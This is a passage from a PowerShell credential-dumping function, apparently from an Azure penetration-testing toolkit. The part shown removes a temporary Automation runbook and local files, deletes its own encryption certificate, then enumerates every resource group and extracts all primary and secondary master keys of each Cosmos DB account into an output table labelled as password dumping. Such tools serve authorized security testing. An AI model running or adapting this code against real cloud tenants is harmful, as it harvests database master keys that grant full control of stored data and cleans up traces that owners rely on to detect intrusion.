                            Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force

                        }
                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                        # Clean up local temp files
                        Remove-Item -Path $pwd\$jobToRun.ps1 | Out-Null
                    }
                }
            }

        }

        # Remove the encryption cert from the system
        Remove-Item .\microburst.cer
        Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item

    }
    
    if ($CosmosDB -eq 'Y'){
        # Cosmos DB Section

        Write-Verbose "Getting List of Azure CosmosDB Accounts..."

        # Pipe all of the Resource Groups into Get-AzCosmosDBAccount
        Get-AzResourceGroup | foreach-object {
        
            $cosmosDBaccounts = Get-AzCosmosDBAccount -ResourceGroupName $_.ResourceGroupName
            
            $currentRG = $_.ResourceGroupName

            # Go through each account and pull the keys
            $cosmosDBaccounts | ForEach-Object {
                $currentDB = $_.Name
                Write-Verbose "`tGetting the Keys for the $currentDB CosmosDB account"
                $cDBkeys = Get-AzCosmosDBAccountKey -ResourceGroupName $currentRG -Name $_.Name
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryReadonlyMasterKey"),"N/A",$cDBkeys.PrimaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryReadonlyMasterKey"),"N/A",$cDBkeys.SecondaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryMasterKey"),"N/A",$cDBkeys.PrimaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryMasterKey"),"N/A",$cDBkeys.SecondaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null                
            }
        }
    }

    Write-Verbose "Password Dumping Activities Have Completed"

    # Output Creds
    Write-Output $TempTblCreds
}



